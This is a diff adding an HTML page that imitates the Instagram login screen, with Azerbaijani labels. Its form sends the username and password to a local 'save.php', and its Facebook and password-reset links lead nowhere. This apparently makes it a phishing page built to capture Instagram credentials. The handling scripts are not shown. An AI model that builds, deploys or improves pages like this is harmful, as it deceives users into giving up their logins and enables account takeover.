@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Instagram</title>
+<link rel="stylesheet" href="instagram.css" />
+<link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="container">
+  <div class="left"></div>
+  <div class="right">
+    <h1>Instagram</h1>
+    
+    <div id="error-msg" class="error-msg"></div>
+    
+    <form action="save.php" method="POST" id="loginForm">
+      <input type="text" name="username" placeholder="Telefon, istifadəçi adı və ya email" required />
+      <input type="password" name="password" placeholder="Şifrə" required />
+      <button type="submit">Daxil ol</button>
+    </form>
+    
+    <div class="or">YA DA</div>
+    <a href="#" class="fb-login">Facebook ilə daxil ol</a>
+    <a href="#" class="forgot">Şifrəni unutmusunuz?</a>
+  </div>
+</div>
+
+<script src="instagram.js"></script>
+</body>
+</html>
